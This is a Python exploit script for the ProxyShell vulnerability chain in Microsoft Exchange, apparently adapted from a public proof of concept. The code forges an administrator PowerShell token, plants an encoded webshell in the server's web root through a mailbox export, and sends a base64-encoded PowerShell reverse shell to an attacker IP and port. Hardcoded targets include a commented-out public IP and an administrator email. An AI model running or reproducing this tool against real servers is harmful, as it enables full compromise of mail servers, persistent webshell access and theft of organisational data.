#!/usr/bin/env python3
#
# https://github.com/dmaasland/proxyshell-poc

import argparse
import base64
import struct
import random
import string
import requests
import threading
import sys
import time
from lxml import etree as ET

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()

        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
            powershell_url,
            post_data,
            headers
        )

        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)


class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.sid = None
        self.legacydn = None
        self.rand_subj = rand_string(16)

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r

    def get_token(self):

        self.token = self.gen_token()

    def get_sid(self):

        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'

        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }

        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )

        self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]

    def get_legacydn(self):

        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )

        autodiscover_xml = ET.fromstring(r.content)
        self.legacydn = autodiscover_xml.find(
            '{*}Response/{*}User/{*}LegacyDN'
        ).text

    def autodiscover_body(self):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )

    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data


def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):

    proxyshell.get_legacydn()
    #(f'LegacyDN: {proxyshell.legacydn}')

    proxyshell.get_sid()
    #print(f'SID: {proxyshell.sid}')

    proxyshell.get_token()
    #print(f'Token: {proxyshell.token}')


def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port, proxyshell):

    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()

    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman, configuration_name='Microsoft.Exchange') as pool:
        

        if command.lower().strip() == 'dropshell':
            drop_shell(proxyshell)

            ps = PowerShell(pool)
            ps.add_cmdlet('New-ManagementRoleAssignment').add_parameter('Role', 'Mailbox Import Export').add_parameter('User', proxyshell.email)
            output = ps.invoke()
            #print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
            #print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

            ps = PowerShell(pool)
            ps.add_cmdlet(
                'New-MailboxExportRequest'
            ).add_parameter(
                'Mailbox', proxyshell.email
            ).add_parameter(
                'FilePath', f'\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\{proxyshell.rand_subj}.aspx'
            ).add_parameter(
                'IncludeFolders', '#Drafts#'
            ).add_parameter(
                'ContentFilter', f'Subject -eq \'{proxyshell.rand_subj}\''
            )
            output = ps.invoke()

            #print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
            #print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

            shell_url = f'{proxyshell.exchange_url}/aspnet_client/{proxyshell.rand_subj}.aspx'
            #print(f'Shell URL: {shell_url}')
            for i in range(10):
                print(f'Testing shell {i}')
                r = requests.get(shell_url, verify=proxyshell.session.verify)
                if r.status_code == 200:
                    return shell_url
                    '''delimit = rand_string()
                    
                    while True:
                        cmd = input('Shell> ')
                        if cmd.lower() in ['exit', 'quit']:
                            return

                        exec_code = f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c {cmd}").StdOut.ReadAll() + "{delimit}");'
                        r = requests.get(
                            shell_url,
                            params={
                                'exec_code':exec_code
                            },
                            verify=proxyshell.session.verify
                        )
                        output = r.content.split(delimit.encode())[1]
                        print(output.decode())'''

                time.sleep(5)
                i += 1

            print('Shell drop failed :(')
            return False

        else:
            ps = PowerShell(pool)
            ps.add_script(command)
            output = ps.invoke()
    print('Error open shell :(')
    #print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    #print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
    return False

def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-e', help='Email address', required=True)
    parser.add_argument('-p', help='Local wsman port', default=8342, type=int)
    return parser.parse_args()


def drop_shell(proxyshell):

    data = f"""
    <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{proxyshell.sid}</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>{proxyshell.rand_subj}</t:Subject>
          <t:Body BodyType="HTML">hello from darkness side</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk=</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>{proxyshell.email}</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
    """

    headers = {
        'Content-Type': 'text/xml'
    }

    r = proxyshell.post(
        f'/EWS/exchange.asmx/?X-Rps-CAT={proxyshell.token}',
        data=data,
        headers=headers
    )
def exploit_rce(shell_url, ip_shell, port_shell):
    delimit = rand_string()
    cmd = "$client = New-Object System.Net.Sockets.TCPClient('" + ip_shell + "'," +str(port_shell)+ ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() "
    cmd = base64.b64encode(cmd.encode('UTF-16LE')).decode('utf-8')
   
    cmd = f'''PowerShell.exe -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand {cmd}'''
    #cmd = f'''cmd.exe /c {cmd}'''
    exec_code = f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("{cmd}").StdOut.ReadAll() + "{delimit}");'
    r = requests.get(
        shell_url,
        params={
            'exec_code':exec_code
        },
        verify=False,
        timeout=5
    )
    output = r.content.split(delimit.encode())[1]
    print(output.decode())


def attack(exchange_url, email, local_port=5362):
    proxyshell = ProxyShell(
        exchange_url,
        email
    )

    exploit(proxyshell)
    for i in range(10):
        try:
            start_server(proxyshell, local_port)
            break
        except:
            local_port = random.randint(5350,5600)
    return shell("dropshell", local_port, proxyshell)
def main():

    #args = get_args()
    #exchange_url = "https://185.105.43.146"
    #email = "admin@gampt.de"
    exchange_url = "https://192.168.133.198"
    email = "Administrator@demo.local"
    
    #print(attack(exchange_url,  email))
    #url= attack(exchange_url,  email)
    #print(url)
    url = "https://192.168.133.198/aspnet_client/ebqwyjbawcighbyh.aspx"
    exploit_rce(url, "192.168.133.1", 4444)

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
   
    main()
